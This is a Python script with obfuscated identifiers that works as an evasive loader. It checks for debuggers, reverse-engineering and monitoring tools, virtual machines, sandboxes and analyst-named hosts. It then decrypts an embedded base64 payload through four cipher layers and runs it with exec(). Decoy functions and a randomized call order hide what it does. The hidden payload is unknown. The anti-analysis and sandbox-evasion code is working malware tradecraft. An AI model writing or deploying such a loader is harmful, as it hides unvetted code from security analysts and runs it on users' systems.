#!/usr/bin/env python3
import sys, os, time, threading, gc, platform, socket, random, secrets, base64, hashlib
from datetime import datetime
from Crypto.Cipher import AES, ChaCha20, Salsa20
from Crypto.Protocol.KDF import scrypt

OI0olI1lOl0oOO__Oo_l = bytes.fromhex('25b6552b78875868e13a017498156e804773e3fd4fd320736d4d75b1cea441974030b654752d85b9a0773cf540358a9a74be3072a6d2f7e233a625a7c0323061')
loO0lI0oloO0lo0Oll0O = 0
o_l1OollIO0oII0oll0o = [secrets.randbits(64) for _ in range(12)]
Il1Oo0II_o0OlI1lOI1l = {'last_check': time.time(), 'violations': 0, 'session_start': time.time()}
I0O0oIII1lO00_l0oOO_ = [threading.Event() for _ in range(3)]

def O_I0oloO0oI0l0oOlIoO():
    global o_l1OollIO0oII0oll0o, Il1Oo0II_o0OlI1lOI1l
    if hasattr(sys, 'gettrace') and sys.gettrace() is not None:
        o_l1OollIO0oII0oll0o[0] ^= 0xDEADBEEF
        raise RuntimeError("Debugger detected")
    try:
        frame = sys._getframe()
        if frame.f_trace is not None or frame.f_back.f_trace is not None:
            raise RuntimeError("Debugger frame detected")
    except:
        pass
    measurements = []
    for _ in range(5):
        start = time.perf_counter_ns()
        dummy = sum(i * random.randint(1, 100) for i in range(3000))
        elapsed = time.perf_counter_ns() - start
        measurements.append(elapsed)
    avg_time = sum(measurements) / len(measurements)
    if avg_time > 150_000_000 or max(measurements) > 300_000_000:
        raise RuntimeError("Timing anomaly detected")
    obj_count = len(gc.get_objects())
    if obj_count > 500000 or obj_count < 500:
        raise RuntimeError("GC anomaly detected")
    suspicious_env = ['PYTHONDEBUG', 'PYTHONINSPECT', 'PYTHONHOME', '_DEBUG']
    if any(var in os.environ for var in suspicious_env):
        raise RuntimeError("Suspicious environment detected")
    try:
        import psutil
        current_proc = psutil.Process()
        if current_proc.memory_info().rss > 2 * 1024 * 1024 * 1024:
            raise RuntimeError("Memory limit exceeded")
        parent = current_proc.parent()
        if parent and any(debugger in parent.name().lower() 
                         for debugger in ['ida', 'olly', 'x64dbg', 'ghidra', 'radare', 'gdb']):
            raise RuntimeError("Debugger process detected")
        dangerous_processes = [
            'ida', 'ida64', 'ollydbg', 'x32dbg', 'x64dbg', 'windbg', 'ghidra',
            'radare2', 'r2', 'gdb', 'lldb', 'wireshark', 'processhacker',
            'cheatengine', 'artmoney', 'debugview', 'procmon', 'regmon',
            'filemon', 'apimonitor', 'detours', 'apihook', 'hookapi'
        ]
        for proc in psutil.process_iter(['name']):
            proc_name = proc.info['name'].lower()
            if any(tool in proc_name for tool in dangerous_processes):
                raise RuntimeError("Security tool detected")
    except ImportError:
        pass
    except:
        pass
    Il1Oo0II_o0OlI1lOI1l['last_check'] = time.time()
    o_l1OollIO0oII0oll0o[random.randint(0, len(o_l1OollIO0oII0oll0o)-1)] ^= random.randint(1, 0xFFFF)

def lOOIl0I0ol_I1lOlo0Ol():
    vm_signatures = [
        'vmware', 'virtualbox', 'vbox', 'qemu', 'xen', 'parallels',
        'hyperv', 'hyper-v', 'kvm', 'bochs', 'wine', 'docker', 
        'kubernetes', 'sandboxie', 'cuckoo', 'anubis', 'joebox',
        'threatexpert', 'cwsandbox', 'comodo', 'sunbelt', 'gfi'
    ]
    system_info = (platform.system() + platform.machine() + 
                  platform.processor() + platform.platform()).lower()
    if any(sig in system_info for sig in vm_signatures):
        raise RuntimeError("VM environment detected")
    try:
        hostname = socket.gethostname().lower()
        suspicious_hostnames = vm_signatures + [
            'sandbox', 'malware', 'analysis', 'test', 'victim', 'sample',
            'honeypot', 'research', 'analyst', 'reverse', 'debug'
        ]
        if any(name in hostname for name in suspicious_hostnames):
            raise RuntimeError("Suspicious hostname detected")
    except:
        pass
    try:
        start = time.perf_counter()
        for _ in range(200000):
            _ = random.random() ** 0.5
        cpu_time = time.perf_counter() - start
        if cpu_time > 1.0:
            raise RuntimeError("CPU timing anomaly detected")
        start = time.perf_counter()
        data = [random.randint(0, 1000000) for _ in range(50000)]
        data.sort()
        memory_time = time.perf_counter() - start
        if memory_time > 0.5:
            raise RuntimeError("Memory timing anomaly detected")
    except:
        pass
    vm_files = [
        '/proc/vz', '/proc/bc', '/.dockerenv', '/.dockerinit',
        '/usr/bin/VBoxControl', '/usr/bin/VBoxService',
        'C:\\windows\\system32\\drivers\\VBoxMouse.sys',
        'C:\\windows\\system32\\drivers\\vmhgfs.sys'
    ]
    for vm_file in vm_files:
        if os.path.exists(vm_file):
            raise RuntimeError("VM files detected")

def lIl0OoO0lllI0olo0Oll(purpose: str, length: int) -> bytes:
    global OI0olI1lOl0oOO__Oo_l
    salt = hashlib.sha256(purpose.encode()).digest()
    key_material = OI0olI1lOl0oOO__Oo_l
    return scrypt(key_material, salt, length, N=2**16, r=8, p=1)

def IIlI0oIl0O_lOO0O0l0o(data: bytes) -> bytes:
    try:
        aes_key = lIl0OoO0lllI0olo0Oll("AES_LAYER", 32)
        chacha_key = lIl0OoO0lllI0olo0Oll("CHACHA_LAYER", 32)
        salsa_key = lIl0OoO0lllI0olo0Oll("SALSA_LAYER", 32)
        xor_key = lIl0OoO0lllI0olo0Oll("XOR_LAYER", 256)
        salsa_nonce = data[:8]
        encrypted_data = data[8:]
        xor_decrypted = bytes(a ^ b for a, b in zip(encrypted_data,
                            (xor_key * (len(encrypted_data) // len(xor_key) + 1))[:len(encrypted_data)]))
        salsa_cipher = Salsa20.new(key=salsa_key, nonce=salsa_nonce)
        chacha_data = salsa_cipher.decrypt(xor_decrypted)
        chacha_nonce = chacha_data[:12]
        chacha_encrypted = chacha_data[12:]
        chacha_cipher = ChaCha20.new(key=chacha_key, nonce=chacha_nonce)
        aes_data = chacha_cipher.decrypt(chacha_encrypted)
        aes_nonce = aes_data[:16]
        aes_tag = aes_data[16:32]
        aes_encrypted = aes_data[32:]
        aes_cipher = AES.new(aes_key, AES.MODE_GCM, nonce=aes_nonce)
        return aes_cipher.decrypt_and_verify(aes_encrypted, aes_tag)
    except Exception:
        raise RuntimeError("Decryption failed")

def loO0lO__OIl0O0OIl_l1():
    global loO0lI0oloO0lo0Oll0O, o_l1OollIO0oII0oll0o, Il1Oo0II_o0OlI1lOI1l
    expected_violations = Il1Oo0II_o0OlI1lOI1l.get('violations', 0)
    current_violations = sum(1 for canary in o_l1OollIO0oII0oll0o if canary & 0xFFFF == 0)
    if abs(current_violations - expected_violations) > 5:
        raise RuntimeError("Integrity check failed")
    pass
    loO0lI0oloO0lo0Oll0O += 1
    pass
    session_duration = time.time() - Il1Oo0II_o0OlI1lOI1l.get('session_start', time.time())
    if session_duration > 172800:
        raise RuntimeError("Session duration exceeded")


def I_l1Ooll0oOI0olI0ol_():
    while True:
        sleep_time = random.uniform(1.5, 4.0)
        time.sleep(sleep_time)
        try:
            O_I0oloO0oI0l0oOlIoO()
            lOOIl0I0ol_I1lOlo0Ol()
            loO0lO__OIl0O0OIl_l1()
            for _ in range(random.randint(1, 3)):
                idx = random.randint(0, len(o_l1OollIO0oII0oll0o) - 1)
                o_l1OollIO0oII0oll0o[idx] ^= random.randint(1, 0xFFFFFFFF)
        except Exception as e:
            print(f"Security violation: {str(e)}")
            sys.exit(1)

def l_Ill1OoIl0OIl0OOI1l():
    try:
        O_I0oloO0oI0l0oOlIoO()
        lOOIl0I0ol_I1lOlo0Ol()
        loO0lO__OIl0O0OIl_l1()
        I0O0oIII1lO00_l0oOO_[0].set()
        O_lI0olIl1OooO0lO0oI = base64.b64decode('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')
        OIl_l1OoI1lO0_oOIl0l = IIlI0oIl0O_lOO0O0l0o(O_lI0olIl1OooO0lO0oI)
        exec(OIl_l1OoI1lO0_oOIl0l.decode(), {'__name__': '__main__', '__file__': __file__})
    except Exception as e:
        print(f"Execution failed: {str(e)}")
        sys.exit(1)

def l_Il0O0_I1lOIoO0lO0o():
    fake_key = secrets.token_bytes(32)
    fake_data = base64.b64encode(secrets.token_bytes(2048)).decode()
    time.sleep(random.uniform(0.005, 0.025))
    return hashlib.sha512(fake_data.encode() + fake_key).hexdigest()

def II1lO0OIl0I1lOIO0oIl():
    operations = random.randint(100, 500)
    for i in range(operations):
        _ = secrets.randbits(64) ^ secrets.randbits(64)
        _ = random.randint(0, 2**32) * random.randint(0, 2**16)
    return secrets.token_hex(32)

def ooll0oO0oI_lI0olI0ol():
    fake_metrics = {
        'entropy': random.uniform(7.8, 8.0),
        'compression_ratio': random.uniform(0.25, 0.75),
        'pattern_count': random.randint(50, 200),
        'signature_matches': [secrets.token_hex(16) for _ in range(random.randint(3, 12))],
        'complexity_score': random.uniform(0.85, 0.99)
    }
    time.sleep(random.uniform(0.01, 0.05))
    return fake_metrics

def l0OIl0l1OoooO0lO0I0o():
    fake_vm_checks = [
        'vmware_detection_passed',
        'virtualbox_detection_passed', 
        'qemu_detection_passed',
        'sandbox_detection_passed'
    ]
    return all(check for check in fake_vm_checks)

if __name__ == "__main__":
    monitor_thread = threading.Thread(target=I_l1Ooll0oOI0olI0ol_, daemon=True)
    monitor_thread.start()
    time.sleep(random.uniform(0.005, 0.1))
    decoy_functions = [l_Il0O0_I1lOIoO0lO0o, II1lO0OIl0I1lOIO0oIl, ooll0oO0oI_lI0olI0ol, l0OIl0l1OoooO0lO0I0o]
    random.shuffle(decoy_functions)
    execution_pattern = random.randint(1, 4)
    if execution_pattern == 1:
        decoy_functions[0]()
        time.sleep(random.uniform(0.001, 0.01))
        l_Ill1OoIl0OIl0OOI1l()
        decoy_functions[1]()
    elif execution_pattern == 2:
        decoy_functions[1]()
        decoy_functions[2]()
        time.sleep(random.uniform(0.001, 0.01))
        l_Ill1OoIl0OIl0OOI1l()
    elif execution_pattern == 3:
        decoy_functions[2]()
        time.sleep(random.uniform(0.001, 0.01))
        l_Ill1OoIl0OIl0OOI1l()
        decoy_functions[3]()
        decoy_functions[0]()
    else:
        decoy_functions[3]()
        decoy_functions[0]()
        time.sleep(random.uniform(0.001, 0.01))
        l_Ill1OoIl0OIl0OOI1l()
        decoy_functions[1]()
